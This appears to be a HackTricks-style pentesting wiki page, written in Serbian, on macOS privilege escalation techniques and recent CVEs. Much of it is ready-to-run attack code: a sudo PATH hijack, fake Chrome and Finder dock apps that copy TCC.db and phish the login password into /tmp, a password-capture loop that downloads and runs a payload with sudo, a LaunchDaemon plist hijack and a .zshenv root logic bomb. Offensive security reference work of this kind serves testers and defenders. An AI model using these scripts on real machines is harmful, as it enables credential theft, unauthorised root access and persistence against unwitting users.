# macOS Eskalacija privilegija

{{#include ../../banners/hacktricks-training.md}}

## TCC Eskalacija privilegija

Ako ste ovde došli tražeći TCC eskalaciju privilegija, idite na:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Imajte na umu da će **većina trikova za eskalaciju privilegija koji utiču na Linux/Unix takođe uticati na MacOS** mašine. Zato pogledajte:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Interakcija sa korisnikom

### Sudo Hijacking

Originalnu [Sudo Hijacking tehniku možete pronaći u članku o Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Međutim, macOS **zadržava** korisnikov **`PATH`** kada on izvršava **`sudo`**. To znači da bi drugi način za izvođenje ovog napada bio **preuzimanje drugih binarnih datoteka** koje će žrtva i dalje izvršavati prilikom **pokretanja sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Imajte na umu da će korisnik koji koristi **terminal** vrlo verovatno imati instaliran **Homebrew**. Zato je moguće hijack-ovati binarne fajlove u **`/opt/homebrew/bin`**.

### Dock Impersonation

Korišćenjem **social engineering-a** možete, na primer, **impersonate-ovati Google Chrome** unutar dock-a i zapravo izvršiti sopstvenu skriptu:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Neki predlozi:

- Proverite da li se u Dock-u nalazi Chrome i, ako se nalazi, **uklonite** tu stavku i **dodajte** **fake** **Chrome stavku na istoj poziciji** u Dock nizu.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Neki predlozi:

- **Ne možete ukloniti Finder iz Dock-a**, pa ako ćete ga dodati u Dock, možete staviti lažni Finder odmah pored pravog. Za ovo morate **dodati unos lažnog Finder-a na početak niza Dock-a**.
- Druga opcija je da ga ne postavite u Dock, već ga samo otvorite; „Finder traži dozvolu za upravljanje Finder-om“ nije toliko čudno.
- Druga opcija za **eskalaciju na root bez traženja** lozinke uz užasan prozor jeste da naterate Finder da zaista zatraži lozinku za izvršavanje privilegovane radnje:
- Zatražite od Finder-a da kopira novu **`sudo`** datoteku u **`/etc/pam.d`** (dijalog za unos lozinke će naznačiti da „Finder želi da kopira sudo“)
- Zatražite od Finder-a da kopira novi **Authorization Plugin** (Možete kontrolisati ime datoteke tako da će dijalog za unos lozinke naznačiti da „Finder želi da kopira Finder.bundle“)

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Phishing sa zahtevom za lozinku + ponovna upotreba sudo

Malware često zloupotrebljava interakciju sa korisnikom kako bi **uhvatio lozinku koja omogućava sudo** i programski je ponovo upotrebio. Uobičajen tok:

1. Identifikovati prijavljenog korisnika pomoću `whoami`.
2. **Ponavljati zahteve za lozinku** sve dok `dscl . -authonly "$user" "$pw"` ne vrati uspeh.
3. Keširati akreditiv (npr. `/tmp/.pass`) i izvršavati privilegovane radnje pomoću `sudo -S` (lozinka preko standardnog ulaza).

Primer minimalnog lanca:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Ukradena lozinka se zatim može ponovo upotrebiti za **uklanjanje Gatekeeper karantina pomoću `xattr -c`**, kopiranje LaunchDaemons ili drugih privilegovanih datoteka i neinteraktivno pokretanje dodatnih faza.<sup>[[1]](#references)</sup>

## Vektori specifični za novije verzije macOS-a (2023–2025)

### Zastareli `AuthorizationExecuteWithPrivileges` je i dalje upotrebljiv

`AuthorizationExecuteWithPrivileges` je označen kao zastareo u verziji 10.7, ali **i dalje radi na sistemima Sonoma/Sequoia**. Mnogi komercijalni updateri pozivaju `/usr/libexec/security_authtrampoline` sa nepouzdanom putanjom. Ako ciljna binarna datoteka dozvoljava upis korisniku, možete postaviti trojanca i iskoristiti legitimni upit:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Kombinujte sa **masquerading trikovima iznad** kako biste prikazali uverljiv dijalog za lozinku.


### Privileged helper / XPC trijaža

Mnogi savremeni third-party macOS privescs prate isti obrazac: **root LaunchDaemon** izlaže **Mach/XPC service** iz direktorijuma **`/Library/PrivilegedHelperTools`**, a zatim helper ili **ne validira klijenta**, validira ga **prekasno** (PID race), ili izlaže **root metodu** koja koristi path/script pod kontrolom korisnika. Ovo je klasa bugova koja stoji iza mnogih nedavnih helper bugova u VPN klijentima, game launcherima i updaterima.<sup>[[2]](#references)</sup>

Brza trijaža — kontrolna lista:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Obratite posebnu pažnju na pomoćne usluge koje:

- nastavljaju da prihvataju zahteve **nakon deinstalacije** zato što je job ostao učitan u `launchd`
- izvršavaju skripte ili čitaju konfiguraciju iz **`/Applications/...`** ili drugih putanja u koje korisnici koji nisu root mogu da upisuju
- oslanjaju se na validaciju peer-a zasnovanu na **PID-u** ili samo na **bundle-id-u**, koja može biti podložna race uslovima

Za više detalja o greškama u autorizaciji pomoćnih usluga pogledajte [ovu stranicu](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Nasleđivanje okruženja skripte PackageKit (CVE-2024-27822)

Sve dok Apple to nije popravio u verzijama **Sonoma 14.5**, **Ventura 13.6.7** i **Monterey 12.7.5**, instalacije koje je korisnik pokrenuo putem **`Installer.app`** / **`PackageKit.framework`** mogle su da izvrše **PKG skripte kao root unutar okruženja trenutnog korisnika**. To znači da bi paket koji koristi **`#!/bin/zsh`** učitao napadačev **`~/.zshenv`** i izvršio ga kao **root** kada bi žrtva instalirala paket.<sup>[[3]](#references)</sup>

Ovo je naročito zanimljivo kao **logic bomb**: potreban vam je samo foothold na korisničkom nalogu i shell startup fajl u koji može da se upisuje, a zatim čekate da korisnik izvrši bilo koji ranjivi installer zasnovan na **zsh-u**. Ovo se uglavnom **ne odnosi** na **MDM/Munki** deployment-e, jer se oni izvršavaju unutar okruženja root korisnika.<sup>[[3]](#references)</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Ako želite dublji uvid u zloupotrebu specifičnu za instalere, pogledajte i [ovu stranicu](macos-files-folders-and-binaries/macos-installers-abuse.md).

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Ako su LaunchDaemon plist ili njegov cilj `ProgramArguments` **upisivi od strane korisnika**, možete izvršiti privilege escalation tako što ćete ga zameniti, a zatim primorati launchd da ga ponovo učita:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Ovo odražava exploit obrazac objavljen za **CVE-2025-24085**, gde je writable plist iskorišćen za izvršavanje koda napadača kao root.

### XNU SMR credential race (CVE-2025-24118)

**Race u `kauth_cred_proc_update`** omogućava lokalnom napadaču da korumpira read-only credential pointer (`proc_ro.p_ucred`) pokretanjem `setgid()`/`getgid()` petlji u više niti, sve dok ne dođe do torn `memcpy` operacije. Uspešna korupcija obezbeđuje **uid 0** i pristup kernel memoriji. Minimalna PoC struktura:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Uparite sa **heap grooming** tehnikom da biste kontrolisane podatke smestili na mesto sa kog se pokazivač ponovo čita. Na ranjivim buildovima ovo predstavlja pouzdan **local kernel privesc** bez potrebe za SIP bypass-om.<sup>[[4]](#references)</sup>

### SIP bypass putem Migration Assistant-a ("Migraine", CVE-2023-32369)

Ako već imate root, SIP i dalje blokira upisivanje u sistemske lokacije. Greška **Migraine** zloupotrebljava entitlemenеt Migration Assistant-a `com.apple.rootless.install.heritable` kako bi pokrenula child process koji nasleđuje SIP bypass i prepisuje zaštićene putanje (npr. `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> Lanac napada:

1. Dobavite root na aktivnom sistemu.
2. Aktivirajte `systemmigrationd` pomoću posebno kreiranog stanja kako bi pokrenuo binary pod kontrolom napadača.
3. Iskoristite nasleđeni entitlement za izmenu datoteka zaštićenih SIP-om, čime se persistence zadržava i nakon reboot-a.

### NSPredicate/XPC expression smuggling (klasa grešaka CVE-2023-23530/23531)

Više Apple daemon-a prihvata **NSPredicate** objekte putem XPC-a i proverava samo polje `expressionType`, nad kojim napadač ima kontrolu. Kreiranjem predicate-a koji izvršava proizvoljne selectore možete postići **code execution u root/system XPC servisima** (npr. `coreduetd`, `contextstored`). Kada se ovo kombinuje sa početnim bekstvom iz app sandbox-a, dobija se **privilege escalation bez korisničkih promptova**. Potražite XPC endpoint-e koji deserijalizuju predicate-e i nemaju robustan visitor.<sup>[[6]](#references)</sup>

## TCC - Root eskalacija privilegija

### CVE-2020-9771 - mount_apfs TCC bypass i eskalacija privilegija

**Bilo koji korisnik** (čak i korisnik bez privilegija) može da kreira i mount-uje Time Machine snapshot pomoću `-o noowners` i da **pristupi SVIM datotekama** tog snapshot-a, zaobilazeći provere vlasništva na aktivnom volumenu. Jedina potrebna privilegija jeste da aplikacija koja se koristi (kao što je `Terminal`) ima **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Komande i potpuno objašnjenje nalaze se na stranici o TCC bypass-ima:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Osetljive informacije

Ovo može biti korisno za eskalaciju privilegija:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Reference

- [1] [Pentest Partners - 2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [5] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - A New Privilege Escalation Bug Class on macOS and iOS (CVE-2023-23530/23531)](https://www.trellix.com/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)

{{#include ../../banners/hacktricks-training.md}}
